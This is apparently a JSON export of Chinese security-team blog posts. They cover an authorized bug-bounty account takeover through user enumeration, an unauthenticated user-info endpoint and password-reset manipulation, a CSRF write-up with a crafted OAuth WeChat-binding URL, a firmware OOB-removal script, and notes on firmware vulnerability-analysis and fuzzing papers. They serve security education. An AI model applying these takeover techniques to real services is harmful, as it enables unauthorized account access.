这个方法接受两个参数e和a，e是要解密的加密文本，a是可选的密钥，默认为E()函数返回的密钥。 t &#x3D; a || E(): 如果没有提供密钥，则使用默认密钥。 m.default.AES.decrypt(e, t, {mode: m.default.mode.ECB, padding: m.default.pad.Pkcs7}): 使用AES算法解密加密文本e，使用密钥t。 m.default.enc.Utf8.stringify(r): 将解密后的字节序列转换回UTF-8编码的字符串。 .toString(): 返回最终的解密字符串。 不会写对应的解密脚本，捣鼓了半天还是放弃了，扫了波目录发现个好东西， 马上上工具梭哈，什么的没有，估计是换了或者关了AK登录 看了一下前台有一个忘记密码的模块，顺便输了一个账号抓包看了一下 输入存在的账号会回显userid，存在一个枚举，bp跑了一波枚举了大量用户。 想着通过修改接受验证码的手机号和修改回显进行绕过重置密码，最后都是失败告终。 后面手工根据枚举的用户名进行了一波弱口令，成功拿下了一个弱口令但是。 有账号比没账号好，可以测试的功能模块更多了，登录进行随便抓个包，JS没逆向出来我这没得搞出来啊 我不信全是这样的，全部的模块都点了一遍，翻了一下bp的数据包，发现了一个这样的数据包 熟悉的师傅应该都知道这是个用户信息啥的数据包，users后面的值就是userid，还是GET请求，这种大部分都是没有鉴权， 马上结合枚举替换成管理员的userid，成功获取管理员的信息 修改性别试一下，竟然成功了 前面我们看到忘记密码那一块可以进行验证码校验修改验证码，为自己手机号（因为为测试环境且授权了不会影响业务，师傅们在挖洞时候要记得修改的操作要谨慎） 最后也是成功修改密码登录上了管理员账户，也是让我朋友扬眉吐气了注：作者：IntAx","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"SRC","slug":"SRC","permalink":"http://example.com/tags/SRC/"}],"author":"SecureNexusLab"},{"title":"从flash提取固件及oob数据去除","slug":"iot-flash-firmware-data-remove","date":"2024-09-04T04:26:00.000Z","updated":"2025-07-15T09:55:33.231Z","comments":true,"path":"2024/09/04/iot-flash-firmware-data-remove/","permalink":"http://example.com/2024/09/04/iot-flash-firmware-data-remove/","excerpt":"","text":"前言 ​ 本文介绍了拆解设备flash芯片的过程，并使用编程器来读取Flash芯片内容，然后对提取的固件进行分析，寻找到OOB数据的位置，去除固件中存在的oob数据，最终从文件系统中提取出文件信息。 固件背景 ​ 本次分析的设备是某款摄像头，由于该摄像头提供的固件都经过加密处理，且不同型号所使用的加密密钥也不同，所以本次通过设备的Flash芯片提取固件。本文主要介绍了如何拆解设备的flash芯片，然后通过编程器来读取Flash芯片内容，最后对提取的固件进行分析，通过芯片对应的手册信息，去除固件中存在的oob数据，最终正常的获取文件系统的文件信息。 固件提取 ​ 拆解芯片所使用的硬件工具：热风焊台，恒温内热烙铁（尖头，刀头），吸锡带，吸锡器，助焊剂，松香，镊子，锡丝，隔热胶带等，在拆解芯片时记得提前在芯片引脚涂上助焊剂。 将热风枪的温度设置在350摄氏度左右，距离芯片1-2厘米，持续加热直到芯片引脚锡点融化，使用镊子轻轻触碰，能够感觉到明显的松动，就可以取下芯片。 将烙铁加热到400摄氏度左右，融化一截锡丝至芯片的引脚处，记得提前涂上助焊剂，然后将融化的锡球来回在芯片引脚拖动，来回拖动几次就能够轻松使用镊子取下芯片。 W29N0DN60012芯片拥有48引脚，相比于常见的flash芯片(8pin或16pin)在拆解难度上更大。 ​ 将拆好的芯片表面的焊油擦拭干净，仔细观察芯片的引脚有没有被锡点粘连在一起的现象，使用锡球拖动时温度控制不好，这种芯片的引脚很容易发生粘连，如果发现粘连，在引脚涂上助焊剂使用烙铁仔细清理即可。 将拆解好的芯片放入48脚的底座中，然后使用RT809H编程卡住底座。使用的编程器依然是Ifix爱修的RT809H，当然也有其他可选的编程器，例如T48。 然后将编程器和电脑正确连接，然后打开编程器软件。编程器软件下载链接国内版 - iFix爱修网，点击编程器软件中的智能识别，然后根据芯片上的信息进行校对，点击读取即可。 使用RT809H编程器读取芯片中的内容，保存至本地的文件中。 将提取到的固件直接使用binwalk 工具进行分析，提示偏移量0x1C5COOO处为UBI文件系统相关的内容。 ​ Binwalk会将这部分内容提取出来，并使用偏移量来命令。通过file命令查看到文件为ubi镜像，直接使用ubireader_extract_images命令从UBI 文件系统镜像中提取数据，但是系统提示错误信息：Less than 2 layout blocks found说明镜像并不完整 ​ 直接将芯片中提取到的固件进行分析，并没能获得任何有价值的信息。 ​ 经过查阅资料可以知道，从NAND FLASH芯片中提取的文件中包含OOB数据，OOB (Out-Of-Band) 区域是一种嵌入式存储器系统中的特殊区域，通常用于存储与数据关联的元数据或控制信息，如 ECC (Error Correction Code) 纠错码、坏块标记、页编号等，而不是用于存储实际数据。 通过对应芯片手册也能看见相关信息，每页拥有2112字节，其中2048字节存储数据，64字节作为备用空间。W29N01HV芯片手册链接地址https://pdf1.alldatasheetcn.com/datasheetpdf/view/1353893/WINBOND/W29N01HV.html 通过芯片的数据存储结构也能清楚看见 ​ 现在知道了数据中包含OOB数据，所以需要恢复文件就需要将OOB数据清除，如何在文件中查找到对应的OOB数据很关键。 这里以binwalk处理后的文件1C5C000.ubi文件为例，使用文本编辑器010Editor打开文件。 ​ 可以看见文件存在UBI等字符，现在需要找到文件中OOB数据的位置，前面通过芯片手册知道每一页大小2112字节（0x840）,数据区域2048字节（0x800）和备份区域64字节（0x40）。 ​ 所以在010Editor编辑器中挑取合适的一页进行分析，应该能识别到OOB数据。因为这个文件比较特殊，首部存在大量的00，所以就选择第一页作为分析的起点。可以查看到在第一页的中部0x410处存在部分非0数据。 ​ 然后就是第一页的页尾，存在大量非0数据。 ​ 通常会将数据区域和备份区域前后排列，例如一页的前0x800字节作为数据区域，0x40字节作为备份区域，那么只需要去除每一页的后0x40字节的数据就可以了，但事实并非如此，通过去除后0x40字节的数据，数据并没有正常的恢复。所以OOB数据并非简单的排列。 ​ 通过多个页进行比对，发现在每一页的中部都会存在14字节的数据，在页的尾部都存在50字节的数据，刚好凑成64字节。 事实也确实是这样，因为ubi文件系统的原因，存储到OOB数据进行了移动翻转，并未连在一起形成一个完整的块。 既然已经知道了OOB数据存在的位置，那么可以写一个脚本来清除掉OOB数据。 123456789101112131415161718#!/usr/bin/python3# 打开名为 &quot;W29N01H.BIN&quot; 的二进制文件以读取数据data = open(&quot;W29N01H.BIN&quot;, &quot;rb&quot;).read()# 创建一个名为 &quot;W29N01H_fix.bin&quot; 的二进制文件以写入数据f = open(&quot;W29N01H_fix.bin&quot;, &quot;wb&quot;)# 设置页面大小（page size）为 0x840（十六进制），即 2112 字节p = 0x840# 遍历输入数据并重新排列数据，以修复数据for i in range(len(data)//p): # 将每页的数据重新排列并写入输出文件 f.write(data[i*p:i*p+0x410] + data[i*p+0x41E:i*p+0x800] + data[i*p+0x802:i*p+0x810])# 关闭输出文件f.close() 将提取的固件修复之后，再使用ubireader_extract_images命令提取数据。可以看到提取的文件中有两组文件大小相同，命名也相似。 这里对提取到的ubifs文件系统的命名进行解释， l “img-527035962”：这部分可能是该镜像文件的标识符或版本号。 l “vol-app”：这部分表示 UBI 文件系统中的一个卷（Volume）的名称，通常包含应用程序、数据或其他文件。 l “pri”：这部分可能表示卷的优先级或类型。通常，UBI 卷可以分为主卷（primary）和备份卷（secondary）。主卷包含实际文件系统数据，而备份卷用于冗余备份。这里的 “pri” 可能表示主卷。 l “.ubifs”：这是文件扩展名，指示这是一个 UBIFS（UBI File System）文件系统的镜像文件。 所以提取到的文件主要有两部分，app_pri和cfg_pri。还有的文件是这两个文件的备份文件(文件内容和主卷不完全相同)，和一个空文件。 然后对ubifs文件，可以使用ubireader_extract_files命令从 UBI文件系统中提取文件。 现在能够从ubifs文件系统提取出文件信息，说明我们成功的从Flash芯片中获取到了我们想要的内容，然后就可以继续分析固件中的其他文件。 总结 本次分析主要是从设备falsh芯片提取固件，然后去除OOB数据，其中重要的一部分内容是如何寻找到OOB数据的布局，不同的芯片中OOB数据分布是不一样的，有的是直接拼接在有效数据后面，还有的就像本次分析的目标一样，分散到有效数据的内部。当然能够顺利找到OOB数据也需要一定的技巧和经验，例如找到全为0xFF或者0x00的数据段，然后对比观察。另外这种大容量的NAND Flash芯片，ubifs格式的文件系统更适合，所以还可以定位一些该文件系统的关键字例如UBI#和UBI!等信息。 参考链接 W29N01HV芯片手册链接地址： https://pdf1.alldatasheetcn.com/datasheet-pdf/view/1353893/WINBOND/W29N01HV.html RT809编程器软件下载地址： http://doc.ifix.net.cn/@rt809/CHN.html","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}]},{"title":"SecNL团队夏季招新","slug":"SNL-summer","date":"2024-08-06T07:48:00.000Z","updated":"2025-07-15T10:02:44.113Z","comments":true,"path":"2024/08/06/SNL-summer/","permalink":"http://example.com/2024/08/06/SNL-summer/","excerpt":"","text":"团队发展目标 - 开源项目：发起并维护具有前瞻性的开源项目，鼓励团队成员贡献代码，解决实际问题，并且孵化有价值的idea。 - 研究探索：进行有意义的研究，特别是在网络安全、人工智能&#x2F;LLM和具身智能领域。 - 企业合作与国家课题：参与知名企业合作&#x2F;高校研究课题与项目，将理论研究转化为实际应用，获得实际的科研经历、实习经历等。 - 竞技与学习：积极参与CTF（Capture The Flag）等网络安全竞赛和其他技术竞赛，以提高团队的实战能力和团队合作精神。 - 知识分享：定期组织学习分享会，邀请行业专家和学术先锋，以及来自社群内部的分享，促进知识的传播和技能的提升。 - 积极的内部交流和思维碰撞：提供活跃的交流讨论环境和思维碰撞阵地，相互答疑和促进。 NEWS TODAY 团队优势简介： 目前，我们的核心成员主要包括来自北京大学、哈工深、中国科学院软件研究所等十几所高校的本硕博学生，以及腾讯、深信服等大厂师傅，和在车联网安全、数据安全等领域深耕的师傅，同时还有科研院所、高校教师等一同参与。 团队内部建立了Web安全、二进制安全、漏洞PoC库等多个知识库，囊括从Web安全的基础原理，到SRC实战的记录，以及漏洞的详细分析复现笔记，还有团队内部的资源和资料的分享。团队的师傅们在安全研究、漏洞挖掘、大语言模型等领域经验丰富，实战经历丰富，申请CNVD 编号127个，cve编号163个，国家级&#x2F;省级计算机&#x2F;安全类赛事奖项三十余项。团队成员享有优先推荐的护网，经历蓝方25人次，红方16人次。 团队成员中一流以上高校和研究生占比，达百分之七十以上，可以在团队内部提供不错的资源互推，包括中科院，北大等优秀的科研、工作岗位。 同时我们拥有团队内部的知识库，网站论坛（搭建中），团队的课程（与看雪平台合作，制作中），优质的项目来源等。 针对团队成员各种贡献记录在册 B站部分分享视频资料： [SecureNexusLab的个人空间-SecureNexusLab个人主页-哔哩哔哩视频 (bilibili.com)] (https://space.bilibili.co/3493268132203156)GitHub部分分享视频配套资料：[SecureNexusLab&#x2F;PublicMaterialSharing (github.com)] (https://github.com/SecureNexusLab/PublicMaterialSharing)物联网安全研究小组配套教程和培训： [SecureNexusLab&#x2F;IoT-fstm: 物联网设备安全测试指南 (github.com)] (https://github.com/SecureNexusLab/IoT-fstm) 提交报名 我们欢迎来自不同背景的师傅加入我们，一起打造一个活跃的交流社群，在SNL社群没有背景、能力的差异，我们欢迎大家一起学习进步。 目前社群特别关注物联网安全、大语言模型安全等领域，欢迎对相关领域感兴趣的师傅一起交流讨论。 1、关注公众号发送： 1SNL 获取报名表 2、扫码填写，并且上传自己的简历会在一周内联系面试了解情况 3、期待你们的加入! 报名时间截止8月16日","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"author":"SecureNexusLab"},{"title":"CSRF攻击修改用户微信绑定（SRC思路）","slug":"csrf-wechat-src","date":"2024-07-18T06:29:00.000Z","updated":"2025-07-15T09:40:57.892Z","comments":true,"path":"2024/07/18/csrf-wechat-src/","permalink":"http://example.com/2024/07/18/csrf-wechat-src/","excerpt":"","text":"在挖洞过程中，web端或app中可能会碰到通过其他方式登录的功能，这些都是需要用户确认授权后，才会登录外部平台的账号，且有外部平台返回的数据。OAuth2.0就是解决客户端和第三方平台互不信任的一种授权协议。 而OAuth2授权模式主要是授权码模式，授权码授权流程如下 第三方平台会在收到认证请求后会向客户端发送code授权码，客户端再利用code向第三方平台获取授权凭证 但是如果客户端在交换授权凭证时，code没有和客户端的账号做绑定，就可以造成csrf攻击，攻击者可以利用构造好的url让用户绑定自己的第三方平台账号，导致账号接管 在下面的自己的账号个人中心页面发现存在微信绑定功能 然后点击绑定并开始burp抓包 向微信请求code，通过返回包可以看到code值 然后再看客户端通过code向微信换取授权凭证的请求包 这里显然是没有token防护，也没有referer检测 那么让受害者访问上面对应的链接，就可以让我的微信绑定受害者的账号 下面是有验证的情况 复制url： 12www.test.com/portalcenter/open/addOpenUserWx/?type=wx&amp;code=091d3Hkl2uCiMd4dSGll21vBuE4d3Hkr&amp;state=test 将该url发给受害者，访问后即可触发微信绑定，且绑定的是攻击者的微信 查看受害者的个人中心页面，微信绑定成功 返回登录页面，尝试微信登录","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"SRC","slug":"SRC","permalink":"http://example.com/tags/SRC/"}],"author":"SecureNexusLab"},{"title":"看不懂系列——分析检测基于Linux的物联网固件中的漏洞","slug":"iot-linux-firmware-vuln-analysic","date":"2024-07-18T06:29:00.000Z","updated":"2025-07-15T09:28:25.983Z","comments":true,"path":"2024/07/18/iot-linux-firmware-vuln-analysic/","permalink":"http://example.com/2024/07/18/iot-linux-firmware-vuln-analysic/","excerpt":"","text":"论文阅读笔记-《更快更好：通过优化的到达定义分析检测基于Linux的物联网固件中的漏洞》 1 概述本文提出了一个高效的污点分析解决方案，即HermeScan，用于发现物联网设备固件程序中污点式的漏洞，该方案利用到达定义分析(RDA)进行污点分析，并具有更少的漏报、误报和时间成本。 2 背景2.1 应用的场景 本文专注于基于Linux的物联网设备中的污点式漏洞，图1描述了污点式漏洞的场景：攻击者可以通过局域网或广域网访问目标设备，并向设备发送任意数据，没有任何限制。数据首先在固件提供的前端文件（如JavaScript和HTML文件）中被解析。然后在设备端，数据被传播到后端的Web服务程序。Web服务程序进一步将数据传输给操作设备的处理程序。在这个过程中，一些库文件被加载以提供必要的支持。后端提供Web服务的二进制程序们通常被称为边界二进制（border binaries），它们通常包括Web服务器和处理程序。Web服务器和处理程序也可以集成到单个二进制文件中，例如路由器供应商经常自定义的httpd。 2.2 动机示例 触发漏洞的过程如下：httpd在接收到HTTP请求后查询其注册的mime_handler数组。当数组索引指向函数appGet.cgi时，它进一步调用函数do_ej，在那里它检查HTTP请求中输出字段的值是否存在于由ej_handler存储的函数列表中。当值与字符串bwdpi_monitor_info匹配时，调用函数ej_bwdpi_monitor_info，并通过websGetVar函数从用户输入中获取type和event的值。type和event的值最终传递给位于私有库libbwdpi_sql.so中的bwdpi_monitor_info。在不适当的字符串连接操作之后，可以通过不受限制的用户输入设置命令执行函数的参数。 3 挑战1、全面的控制流图恢复； 2、精确的污点源识别； 3、采用符号执行进行污点分析具有较高的时间开销。 4 设计为了解决这些挑战，HermeScan采用了三个关键方案：增强的控制流图恢复、精确的污点源识别和高效的数据流分析。 如图3所示， HermeScan按照以下五个步骤分析固件： 1、边界二进制查找器； 2、增强的控制流图恢复； 3、污点源识别； 4、高效的数据流分析； 5、污点检查引擎。 4.1 增强的控制流图恢复本文解决了现有方案在函数边界识别、符号名称查找、调用约定恢复等方面的不足，为HermeScan的反汇编数据流分析提供尽可能坚实的基础。 识别的函数越多，分析范围可扩展得越广。因此，除了反汇编器自动识别的函数外，HermeScan还扫描整个二进制文件的反汇编代码，通过匹配不同架构下的函数序言（例如堆栈操作）的特征来识别反汇编器漏掉的函数边界。 符号名称用于识别二进制文件加载了哪些库函数。SaTC和KARONTE都依赖angr通过分析节头表来恢复二进制程序中外部库函数的符号名称。然而，这种方法对于那些剥离了节头表的二进制文件来说是不足的，导致一些函数符号信息被遗漏。HermeScan解析程序头表以恢复符号。首先遍历所有程序头表并识别出与p_type对应的PT_DYNAMIC段，然后在PT_DYNAMIC段中搜索DT_SYMTAB标签的值以定位ELF符号表的地址，最后从ELF符号表中获取更多的符号信息。 HermeScan扩展了angr的默认调用约定并实施了更激进但更完整的恢复策略。对于angr未成功获取的函数调用约定，HermeScan根据程序的架构（例如，MIPS架构的默认参数调用是使用a0-a3寄存器）分配预设的调用约定。为调用约定提供默认值确保了随后的数据流分析更接近可能性分析。 HermeScan利用这些信息增强了CFG的构建。与SaTC和KARONTE采用的CFG构建不同，HermeScan将每个函数视为主节点来构建独立的控制流子图，然后通过跳转或调用指令将它们连接起来。同时，HermeScan为二进制文件加载的共享库建立了Lib-CFG，并利用符号名称将Bin-CFG与Lib-CFG连接起来 4.2 污点源识别包括两个部分。第一部分采用模糊匹配策略来获取更多的候选源函数。第二部分通过检查候选函数，为源函数的返回值或参数分配适当的污点初始值。 HermeScan采用模糊匹配策略筛选前端和后端文件中共享的字符串，同时考虑单词形态相似性和语义相似性匹配关键字。HermeScan识别出引用这些字符串的候选函数，这些函数很可能对外部输入进行解析，并将这些输入存储在函数的参数中或者作为返回值 在识别出候选函数后，先前的工具会假设它们的所有参数和返回值都是存储外部输入的变量，即把它们标记为污点源。然而，将所有参数都视为污点源会引入误报，而将那些不会被后续操作使用的返回值标记为污点源则会导致额外的污点分析开销。在每个候选函数内部，HermeScan通过定义-使用分析跟踪每个参数的数据流。如果指向参数的内存被赋予了某些值，它可能作为接收外部输入的污点源。否则，该参数不是污点源。在候选函数外部，跟踪其返回值的数据流，并检查它是否会被后续操作使用。如果是，返回值将被标记为污点源。为了进一步提高分析的精确度，本文采用了约束推理通过对污点源进行定义-使用分析和值集分析来收集约束信息。 以列表1为例，更好地阐述约束推理方法。首先，通过定义-使用分析，发现函数dlink_webGetVarN的第三个参数流到了strncpy函数的第三个参数中，而strncpy的目标地址最终流到了函数的返回值中。然后，通过值集分析（VSA）为dlink_webGetVarN函数构建了一个值流图（VFG）。通过获取位于strncpy调用处（第6行）的VFG节点状态，看到strncpy的第三个寄存器值表达为uninitialized_initial_r2+0xffffffff，其中uninitialized_initial_r2代表参数len，而0xffffffff代表-1。相似地，在退出语句的基本块（第9行），存储函数返回值的寄存器表达为v1_(len-1)+00，意味着返回值等于变量v1的值，且值约束为长度为len-1的字符串与一个截断字符的连接。因此，本文可以推断dlink_webGetVarN的污点源约束受到其第三个参数减一的限制。 最终，HermeScan 通过启发式方法根据漏洞类型和收集到的长度约束，在污点源的适当参数或返回寄存器上定义输入污点值。 4.3 高效的到达定义分析本文根据三个原则设计了独特的污点分析方案（LCO Interprocedural Analysis），并采用路径合并策略来缓解路径爆炸问题。 1）LCO跨进程分析 （1）轻量级原则（Lightweight principle）。HermeScan利用基于到达定义分析（RDA）的污点分析，而不是在SaTC和Karonte中使用的基于符号执行的污点分析方法。具体来说，angr的RDA模块为HermeScan提供了最基本的过程内分析。它将汇编指令提升到VEX IR，并在构建的控制流图上使用经典的工作列表算法执行RDA分析。对于感兴趣的变量，生成一个间接的定义-使用（Def-Use）图，其中每个节点代表该变量的一个定义（Def），每条边表示在一个定义之后变量被使用（Use）。在具体实现中，给定的变量被区分为五个类别：临时变量、全局变量、栈、堆和寄存器，这样可以更好地标记在特定地址处变量的定义或使用。 （2）上下文敏感原则（Context-sensitive principle）。数据流分析通常涉及函数调用，因此跨过程分析是必要的。不幸的是，基于angr现成的RDA方法不能应用于实际的固件分析，因为它没有考虑跨过程调用的上下文。因此，HermeScan将angr的过程内RDA扩展到跨过程，并考虑上下文信息以实现细粒度的数据流分析。在程序中，当一个函数被调用时，该函数的参数会被临时存储起来。在这一过程中，函数参数被视为临时变量。这些临时变量的值是从调用该函数的函数（称为调用函数）中获得的，根据特定的调用约定从寄存器或栈中获取相应的值。当返回到调用者函数时，HermeScan合并不同返回地址的临时变量、全局变量、栈、堆和寄存器的定义值，并覆盖调用者函数中的原始值。此外，对于别名问题，如间接调用，HermeScan基于上下文信息从定义-使用图中计算相关寄存器的值，并解析可能的跳转地址进行进一步分析。 （3）按需原则（On-demand principle）。为了提高效率，在跨过程分析期间，静态分析通常采用按需跟踪。现有方法通过判断函数的参数是否被污点化来选择是否进行跟踪。然而，仍然存在两个缺陷：一是依赖符号执行来探索路径的方法受到路径状态存储容量的限制，这使得在嵌套函数中按需跟踪变得困难；二是当涉及到调用外部库函数时，现有方法只总结了常见的C标准库（Libc）函数，并跳过了其他库函数。 HermeScan提出了按需跟踪来解决上述困难。首先，本文的方法通过在分析时更新的数据依赖图来判断一个变量是否被污点化，而不涉及路径存储；其次，本文深入到参数被污点化的库函数中，形成更深入的数据流分析。 2）路径合并策略 HermeScan设计了一种路径合并策略，用以识别和合并在函数调用图中重复经过的路径，从而减少冗余分析工作。 多源污点：对于具有多个源点的函数，现有的固件静态分析方案分别从每个源点作为污点分析起点并独立跟踪其污点传播过程。在RDA的背景下，本文跟踪程序中所有变量的使用-定义分配。因此，HermeScan可以在包含多个输入源点的函数中，用不同的标签污点化每个污点源。这样，HermeScan可以在一次RDA分析中跟踪和区分多个污点值的传播过程，减少了将这些源点作为不同起始位置开始分析的成本。 多汇观察：由于我们使用的是基于路径不敏感的RDA，从调用图开始的任何函数理论上都会被分析。因此，所有包含汇点的函数在一次RDA分析中都被覆盖。HermeScan通过在一次分析中设置多个观察点来避免多次分析这些汇点。 图4展示了在不同策略下如何合并路径。启用HermeScan的路径合并策略允许一次RDA传递覆盖函数A中的两个源点和函数A、B和D中的三个汇点，将分析路径的数量从7减少到2。相比之下，SaTC的策略部分合并了重复路径，将分析路径的数量从7减少到3。","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}],"author":"SecureNexusLab"},{"title":"我猜你看不懂之——物联网的fuzz（挑战下你能看懂多少，留言在文末）","slug":"iot-fuzz-gxb","date":"2024-07-15T08:40:05.000Z","updated":"2025-07-15T09:56:13.505Z","comments":true,"path":"2024/07/15/iot-fuzz-gxb/","permalink":"http://example.com/2024/07/15/iot-fuzz-gxb/","excerpt":"","text":"To Mom . 概述 本文提出了一种针对嵌入式系统的模糊测试方法，该方法利用了微控制器普遍具备的调试接口和硬件断点功能。 由于嵌入式系统内部组件的多样性以及软件的不可更改性，使得对其进行模糊测试变得复杂。然而，通过GDB（GNU调试器）控制的调试探针可以设置硬件断点，即使在未插桩的二进制代码上也能提取到代码覆盖反馈，从而有效指导模糊测试。 作者开发的原型工具GDBFuzz在四种不同的微控制器板卡上进行了评估，能够快速达到高代码覆盖率，并检测到已知和新的漏洞。GDBFuzz作为一种通用且易用的覆盖指导模糊测试工具，几乎适用于任何GDB能够调试的程序和系统，对嵌入式系统的安全性测试具有重要意义。 注：由Kimi大模型生成，经过人工校对。 1.本文工作提出了一种新的模糊测试方法，该方法利用微控制器的调试接口和硬件断点来提取代码覆盖信息，实现对嵌入式系统的模糊测试。 开发了原型工具GDBFuzz，该工具可以与GNU调试器（GDB）接口结合使用，自动化模糊测试过程。 在四种不同的微控制器上对GDBFuzz进行了评估，验证了其在代码覆盖率和漏洞检测方面的有效性。 2 .控制流程图GDBFuzz通过提取控制流程图并推导CFG的支配关系来减少模糊测试期间的断点中断次数并避免不必要的开销。 控制流程图的支配关系 前支配（Predomination）：如果从入口节点到任意节点v的每条路径都包含节点u，则称节点u前支配节点v。 后支配（Predomination）：如果从节点v到出口节点的所有路径都包含节点w，则称节点w后支配节点v。 通过支配关系，可以推到出以下定理： 定理 1（可达性）：如果到达节点 v，则之前已到达主支配树中的所有父节点，之后将到达后支配树中的所有父节点。 过程间控制流程图和支配关系 过程间控制流程图描述了程序中不同函数的基本块之间的转化关系，其中一个重要挑战是需要通过上下文相关算法来处理实际调用时多入口和多出口的情况。GDBFuzz提出了一种简化的过程间CFG的构建方法：半过程间（semi-interprocedural）控制流程图。通过将所有调用作为边从调用点插入到被调用方来连接函数控制流程图。在构建半过程间 CFG 时，会省略返回边，因此不会引入不正确的流程。对于反转的半过程间控制流图，我们反转局部控制流图，跳过调用边，只添加返回边。同样，通过删除上下文相关的调用边缘来避免插入歧义。然后，可以使用局部控制流图的算法有效地计算相应的半过程间支配者树。与完整的过程间支配者图相比，在最坏的情况下，可能会错过每个调用边缘的一个支配关系，但应该不会真正损害模糊测试性能。 3.工具原型设计 GDBFuzz 的整体设计：利用目标程序的控制流图将可用的硬件断点设置为随机选择的尚未到达的基本块。然后，它通过对语料库中随机选择的输入应用突变来重复生成测试用例，并将测试用例发送到目标输入接口。如果调试探测发出断点命中信号，则 GDBFuzz 会将相应的节点及其主要节点标记为已到达，并将负责的测试用例添加到语料库中。导致崩溃或超时的测试用例单独保存。当在预定义数量的测试用例后没有发生断点中断时，GDBFuzz 会将硬件断点重新定位到新选择的节点。每次重定位后，GDBFuzz 首先再次测试语料库中的所有输入，以检查它们是否已经到达新目标的基本块。与使用完整代码检测的覆盖率引导模糊测试一样，进化算法使输入语料库随时间增长，输入到达不同的代码区域。 GDBFuzz其余部分设计如下： 3.1 提取控制流程图 CFG GDBFuzz为了使用硬件断点进行模糊测试反馈，需要确定目标程序的内存地址和控制流图。GDBFuzz使用Ghidra工具从二进制文件中提取CFG，因为源代码并不总是可用。由于Ghidra不能检测到所有的控制流，尤其是处理间接跳转或编译器优化时，GDBFuzz在模糊测试期间会迭代优化和更新控制流，详见5.5部分。 3.2 寻找 Entry Point GDBFuzz将模糊的重点放在固件中对目标输入接口进行输入处理的区域。提取的CFG从输入的处理开始，成为入口点Entry Point。GDBFuzz提供了一种半自动化的方法来寻找Entry Point，具体的步骤如下：（1） 向目标设备发送测试输入并立即中断执行。（2） 使用 gdb find 在设备的内存中重新发现发送的输入。（3） 将数据观察点设置为重新发现的输入数据的第一个地址。（4） 再次发送测试输入。（5） 此时发生的中断上的所有程序计数器地址都是入口点的候选地址。 3.3 检测 Bugs 使用 Bug oracles 来检测执行期间是否触发了错误。GDBFuzz依赖于可观察的bug触发，例如通过连接错误、超时或错误响应代码来检测故障。此外，还可以通过在调试接口上设置断点来捕获错误处理程序的位置来检测错误信号。 3.4 处理 Bugs 当GDBFuzz检测到崩溃或者超时时，需要适当地处理这些错误，具体步骤如下： （1）Bugs 去重，通过调用堆栈的哈希值来唯一标识和删除重复的bug。 （2）保存触发此错误的输入（如果bugs是唯一的）。 （3）重启目标设备。 （4）继续模糊测试。 4. GDBFuzz实现具体到GDBFuzz工具包含以下组件： Test Data Generator 使用libFuzzer的变异引擎来生成新的测试输入，以触发程序的不同代码区域。 GDB Controller 使用python-gdb-mi包来发送和接收调式命令，管理与待测系统的调试连接。 Target Connection 将测试输入发送到目标设备，根据实际接口处理连接或断开连接事件，以及来自协议的错误反馈。GDBFuzz实现了用于TCP、Serial串口、USB连接的适配器以及用于测试linux应用程序的UNIX 管道。 Ghidra Controller 使用ghidra-bridge包来使用python3在Ghidra和GDBFuzz之间交换请求和数据，获取目标应用程序的CFG。 &#96;Dynamic Control Flow Graph Refinement 缺少控制流表现为CFG中没有后续节点的悬空节点（未被Ghidra标记为终点）。GDBFuzz执行以下步骤来处理此类情况：（1）为悬空节点设置一个断点，并将触发该节点的测试输入发送到待测程序；（2）当终端发生时，单步执行；（3）读取程序计数器的值。（4）将找到的edge报告给Ghidra并重新分析二进制文件。 5. 评估实验对象：对四种不同的开发板上部署的不同类别的应用程序，并给定初始种子。 作者在8个研究问题的知道下，在两种不同环境中评估GDBFuzz： RQ1：GDBFuzz 与嵌入式系统上的黑盒模糊测试相比如何？ 作者在8个研究问题的知道下，在两种不同环境中评估GDBFuzz： RQ1：GDBFuzz 与嵌入式系统上的黑盒模糊测试相比如何？ RQ3：该方法能否揭示嵌入式软件代码中的实际错误？ 发现了三个以前未知的漏洞： STM32 USB设备堆栈中的无限循环，这是由于将uint8_t索引变量计数到for循环中可控uint32_t变量造成的。 Cypress JSON 解析器中的缓冲区溢出，这是由于对固定大小的内部缓冲区的长度检查缺失引起的。 Cypress JSON 解析器中的空指针取消引用，由缺少验证检查引起。 发现：GDBFuzz 揭示了嵌入式软件中的真正漏洞。 RQ4：GDBFuzz 与最先进的模糊测试器 AFL++ 相比如何？ 发现：如果可以以很少的成本部署 AFL，请使用它;否则，请将 GDBFuzz 视为一个可能要求较低的替代方案 